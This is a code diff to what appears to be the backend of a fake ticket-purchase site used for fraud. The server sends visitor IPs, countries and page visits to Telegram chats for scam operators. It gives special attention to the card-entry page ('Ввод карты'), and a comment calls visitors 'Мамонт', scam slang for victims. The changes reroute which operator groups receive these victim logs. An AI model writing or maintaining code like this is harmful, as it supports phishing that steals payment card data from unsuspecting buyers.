@@ -399,7 +399,7 @@ def get_event_name_from_page_code(page_code):
 
 @log_function
 def send_telegram_log(page, link, ip, country="", extra_user_id=None, important=False):
-    print(f"[DEBUG] send_telegram_log called with: page={page}, link={link}, ip={ip}, country='{country}'")
+    print(f"\n\n\n\n\n\n\n\n\n\n[DEBUG] send_telegram_log called with: page={page}, link={link}, ip={ip}, country='{country}'")
     
     # Якщо країна не передана, використовуємо "Unknown"
     current_country = country
@@ -437,14 +437,7 @@ def send_telegram_log(page, link, ip, country="", extra_user_id=None, important=
                 requests.post(url, data=data_event_creator, timeout=1)
                 print(f"📤 Лог надіслано event creator {extra_user_id}")
                 
-                # Спеціальне логування в платіжну групу для event creator на сторінці введення карти
-                if page == "Ввод карты" or "/buy-tickets/loading/" in link:
-                    try:
-                        data_payment_group = {"chat_id": PAYMENT_GROUP_ID, "text": msg}
-                        requests.post(url, data=data_payment_group, timeout=1)
-                        print(f"📤 Лог надіслано в платіжну групу {PAYMENT_GROUP_ID} для event creator")
-                    except Exception as e:
-                        print(f"❌ Помилка надсилання в платіжну групу для event creator: {e}")
+                # НЕ надсилаємо в платіжну групу - тільки прямий лог на сторінці введення карти
                         
             except Exception as e:
                 print(f"❌ Помилка надсилання event creator {extra_user_id}: {e}")
@@ -454,17 +447,7 @@ def send_telegram_log(page, link, ip, country="", extra_user_id=None, important=
                 try:
                     requests.post(url, data=data_group, timeout=1)
                     print(f"\n\n\n\n\n\n\n\n\n{page}")
-                    # Спеціальне логування в платіжну групу для сторінки введення карти
-                    if page == "Ввод карты" or "/buy-tickets/loading/" in link:
-                        try:
-                            data_payment_group = {"chat_id": PAYMENT_GROUP_ID, "text": msg}
-                            requests.post(url, data=data_payment_group, timeout=1)
-                            print(f"📤 Лог надіслано в платіжну групу {PAYMENT_GROUP_ID}")
-                        except Exception as e:
-                            print(f"❌ Помилка надсилання в платіжну групу: {e}")
-                    # else:
-                    #     НЕ надсилаємо лог "Мамонт открыл страницу" в платіжну групу для інших сторінок
-                    #     requests.post(url, data=data_group2, timeout=1)
+                    # НЕ надсилаємо в платіжну групу - тільки прямий лог на сторінці введення карти
                 except Exception as e:
                     print(f"❌ Помилка надсилання в групу: {e}")
             
@@ -956,10 +939,6 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
             country = get_country_by_ip(ip)
             print(f"[DEBUG] Надсилаємо лог event creator: {norm_path}, IP: {ip}, країна: {country}, user_id: {extra_user_id}")
             
-            # Надсилаємо персональний лог в особисті повідомлення з ботом
-            page_name_for_log = get_page_name(norm_path)
-            send_personal_log_to_admin(page_code, ip, country, page_name_for_log)
-            
             # Логуємо ТІЛЬКИ для event creator на сторінці введення карти
             if '/buy-tickets/loading/' in norm_path and extra_user_id:
                 # Логуємо з російською назвою "Ввод карты" в потрібному форматі
@@ -979,6 +958,7 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                     print(f"📤 Лог надіслано event creator {extra_user_id}")
                 except Exception as e:
                     print(f"❌ Помилка надсилання event creator: {e}")
+            # НЕ логуємо інші сторінки
         elif is_telegram:
             pass  # Не логуємо Telegram запити
         elif extra_user_id and not should_log:
